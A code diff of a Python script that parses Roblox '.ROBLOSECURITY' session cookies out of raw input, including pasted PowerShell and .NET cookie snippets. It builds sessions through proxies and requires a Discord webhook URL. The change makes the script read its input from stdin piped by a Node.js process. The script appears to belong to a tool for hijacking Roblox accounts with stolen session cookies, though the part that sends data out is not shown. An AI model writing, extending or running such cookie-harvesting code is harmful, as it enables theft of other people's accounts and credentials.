@@ -30,15 +30,13 @@ def format_webshare(p_str):
 
 def extract_and_clean_cookie(raw_input):
     if not raw_input:
-                return ""
+        return ""
     raw_str = str(raw_input).strip()
     
-    # 1. If it's a PowerShell script containing .ROBLOSECURITY, extract it using regex
     ps_cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
     if ps_cookie_match:
         raw_str = ps_cookie_match.group(1)
     
-    # 2. Fallback check for general C# / .NET Cookie initializers
     ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
     if ps_match:
         raw_str = ps_match.group(1)
@@ -159,14 +157,16 @@ def get_working_session(roblosecurity):
     return session
 
 def main():
-    if len(sys.argv) < 2:
-        sys.exit(1)
-    
     webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
     if not webhook_url:
         sys.exit(1)
 
-    raw_cookie = extract_and_clean_cookie(sys.argv[1])
+    # Read data safely from standard input (stdin) piped by Node.js
+    raw_input_data = sys.stdin.read()
+    if not raw_input_data:
+        sys.exit(0)
+
+    raw_cookie = extract_and_clean_cookie(raw_input_data)
     if not raw_cookie:
         sys.exit(0)
 
